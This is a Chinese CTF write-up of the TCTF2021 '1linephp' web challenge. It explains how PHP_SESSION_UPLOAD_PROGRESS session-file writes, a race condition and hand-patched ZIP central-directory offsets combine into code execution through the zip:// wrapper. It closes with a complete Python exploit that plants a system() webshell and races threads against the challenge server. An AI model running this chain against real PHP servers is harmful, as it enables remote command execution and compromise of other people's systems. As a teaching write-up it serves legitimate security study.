> 原文链接: https://www.anquanke.com//post/id/246292 


# TCTF2021-1linephp 题解


                                阅读量   
                                **96780**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t01e2aafaaf8d646f42.jpg)](https://p3.ssl.qhimg.com/t01e2aafaaf8d646f42.jpg)



## 前言

这是刚结束的 TCTF2021 的一道 Web 题，题目难度不大，但是解题利用到的知识点非常有意思，这里给各位师傅分享一下。



## 一、题目分析

题目源码：

```
&lt;?php
($_=@$_GET['yxxx'].'.php') &amp;&amp; @substr(file($_)[0],0,6) === '@&lt;?php' ? include($_) : highlight_file(__FILE__) &amp;&amp; include('phpinfo.html');
```

题目存在一个有限制的任意文件包含：
<li>1.后缀必须是 `.php`
</li>
<li>2.文件开头必须为 `@&lt;?php`
</li>
此外，题目提供了 phpinfo 的数据，注意到题目环境安装了一个 ZIP 扩展：

[![](https://p0.ssl.qhimg.com/t012c7d175ff956c68b.png)](https://p0.ssl.qhimg.com/t012c7d175ff956c68b.png)

显然，这道题目是需要利用 ZIP 伪协议，而且正好其格式 `zip://xxxx#xxxx.php` 也可以符合题目文件包含的条件。<br>
那么，另一个问题，如何上传我们的 ZIP 文件呢？这里就需要利用到 `PHP_SESSION_UPLOAD_PROGRESS` 了。



## 二、PHP_SESSION_UPLOAD_PROGRESS

这个知识点，其实并不新颖，这里我也就简单介绍一下：

[![](https://p4.ssl.qhimg.com/t01d23f38a930925317.png)](https://p4.ssl.qhimg.com/t01d23f38a930925317.png)

大概意思就是，当我们上传文件的同时，POST 一个 `session.upload_progress.name` 设定的变量，PHP 就会将 `sessoin.upload_progress.prefix` + `session.upload_progress.name的值` + `文件上传进度的数组` 写入到 sess 文件中。一般而言，默认的 `session.upload_progress.name` 为 `PHP_SESSION_UPLOAD_PROGRESS`。

[![](https://p3.ssl.qhimg.com/t01f559ff6bbccae926.png)](https://p3.ssl.qhimg.com/t01f559ff6bbccae926.png)

但是，注意到，PHP 并没有对 POST 的内容进行检查。因此，我们可以利用这个方法来将我们的一句话木马写入到 sess 文件中，再利用文件包含来获取这个文件。这个方法，适用于所有可以包含到 sess 文件的题目当中。

这里有两个注意点：
<li>1.虽然题目没有 `session_start()`，但是有两种情况下可以自动生成 sess 文件
<ol>
- (1).`session.auto_start=On`。这种情况下，PHP 会自动初始化 session，但是这个选项默认是 Off 的。
- (2).`session.use_strict_mode=0`，这是默认设置。这种情况下，允许用户自定义 PHPSESSID，并且服务器也会在 session 存储路径下产生 `sess_PHPSESSID` 文件。
</ol>
</li>
- 2.配置 `session.upload_progress.cleanup = on` 默认开启，会导致 session 文件内容在文件上传完成后立刻被清空。对于这个问题，就需要我们利用条件竞争漏洞，在 session 文件被清空前将 session 文件内容包含。


## 三、畸形 Zip 构造

这是 eva0 师傅想出来的思路（**据他说，是一个异想天开的想法**），也有本题最有意思的知识点，涉及到 Zip 文件结构。利用思路参考这篇[文章](https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop)，大概意思是说，**zip 文件不是从头开始读内容的，而是先从后往前找标志位进行解析，**涉及到的 Zip 文件结构体有 `Central directory` 和 `End of central directory record`，下面我们来一一讲解。

`Central directory` 的结构如下：

[![](https://p2.ssl.qhimg.com/t01fefeecf3303b1b16.png)](https://p2.ssl.qhimg.com/t01fefeecf3303b1b16.png)

注意到标红的变量，它标明的是 `0x04034b50` 标志头的位置，也就是我们熟悉的 PK 开头位置，默认值为 0x00000000，也就是在 Zip 文件最开头的位置。显然，如果我们想要修改 Zip 的开头，就要将这个值进行修改，这样就可以在 Zip 的 0x04034b50 位置塞脏数据了。

`End of central directory record` 的结构如下：

[![](https://p5.ssl.qhimg.com/t01353b01061789af04.png)](https://p5.ssl.qhimg.com/t01353b01061789af04.png)

同样注意到标红的变量，它标明的是 `0x02014b50` 标志头，也就是 `Central directory` 的起始位置。同样，我们需要修改这个值，使得解析 ZIP 文件的时候，能够正确定位 `Central directory` 的开头位置。

通过上述讲述，相信大家也大概明白，为什么 ZIP 是从后往前解析的，通过 `End of central directory record` 定位 `Central directory` ，再通过 `Central directory` 定位 ZIP 文件开头。



## 四、开始解题

前面我们提到，这是一个受限制的文件包含漏洞，题目会在我们的输入的 `$_GET['yxxx']` 后添加 `.php`，另外题目安装了 ZIP 扩展。所以，我们的思路是使用 `PHP_SESSION_UPLOAD_PROGRESS` 上传一个 ZIP 文件，然后利用 `zip:///tmp/xxxx#shell` 这样的伪协议进行文件包含。

我们知道，使用 `PHP_SESSION_UPLOAD_PROGRESS` 会自动在我们上传的 ZIP 文件前添加 `upload_progress_`，会影响 ZIP 的正常解析。因此，我们需要提前将 ZIP 的两个偏移量进行修改，然后再上传，这样我们就可以正常解析了。

下面是解题的 EXP，可以一步执行命令：

```
#encoding:utf-8
import io
import requests
import threading
from pwn import *
import os, sys

cmd = '''whoami'''
poc = '''@&lt;?=echo "eva0 yyds";system('%s');?&gt;''' % cmd

f = open('shell.php', 'w')
f.write(poc)
f.close()

os.system('rm -rf shell.zip;zip shell.zip shell.php')

f = open('shell.zip', 'rb')
ZipContent = f.read()
f.close()

central_directory_idx = ZipContent.index(b'\x50\x4B\x01\x02')
end_central_directory_idx = ZipContent.index(b'\x50\x4B\x05\x06')

file_local_header = ZipContent[:central_directory_idx]
central_directory = ZipContent[central_directory_idx:end_central_directory_idx]
end_central_directory = ZipContent[end_central_directory_idx:]

def GetHeaderOffset():
    return u32(central_directory[42:46])

def SetHeaderOffset(offset):
    return central_directory[:42] + p32(offset) + central_directory[46:]

def GetArchiveOffset():
    return u32(end_central_directory[16:20])

def SetArchiveOffset(offset):
    return end_central_directory[:16] + p32(offset) + end_central_directory[20:]

def Create(start, end):
    length = len(start)
    HeaderOffset = SetHeaderOffset(length + GetHeaderOffset())
    ArchiveOffset = SetArchiveOffset(length + GetArchiveOffset())

    NewZipContent = file_local_header + HeaderOffset + ArchiveOffset

    return NewZipContent

start = b'upload_progress_'
end = b'|a:5:`{`s:10:"start_time";i:1625309087;s:14:"content_length";i:336;s:15:"bytes_processed";i:336;s:4:"done";b:0;s:5:"files";a:1:`{`i:0;a:7:`{`s:10:"field_name";s:4:"file";s:4:"name";s:13:"callmecro.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1625309087;s:15:"bytes_processed";i:336;`}``}``}`'

ZipContent = Create(start, end)
f = open("shell.zip","wb")
f.write(ZipContent)
f.close()

sessid = 'callmecro'
url = 'http://111.186.59.2:50081/'

def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 1024)
        r = session.post(url, data=`{`'PHP_SESSION_UPLOAD_PROGRESS': ZipContent`}`, files=`{`'file': ('callmecro.txt',f)`}`, cookies=`{`'PHPSESSID': sessid`}`)

def read(session):
    while True:
        r = session.post(url+'?yxxx=zip:///tmp/sess_'+sessid+'%23'+'shell', data=`{``}`)
        if '@eva0 yyds' in r.text:
            print(r.text.strip('@eva0 yyds'))
            event.clear()
            sys.exit()

event=threading.Event()
with requests.session() as session:
    for i in range(30):
        threading.Thread(target=write,args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read,args=(session,)).start()
event.set()
```



## 参考文章
1. [npfs 的《利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含》](https://www.cnblogs.com/NPFS/p/13795170.html)
1. [TGAO 的《利用session.upload_progress进行文件包含和反序列化渗透》](https://www.freebuf.com/news/202819.html)
1. [saltor 的《ZIP文件格式分析》](https://blog.csdn.net/a200710716/article/details/51644421)
1. [p4-team 的《PlaidCTF2016_PixelShop WP》](https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop/src)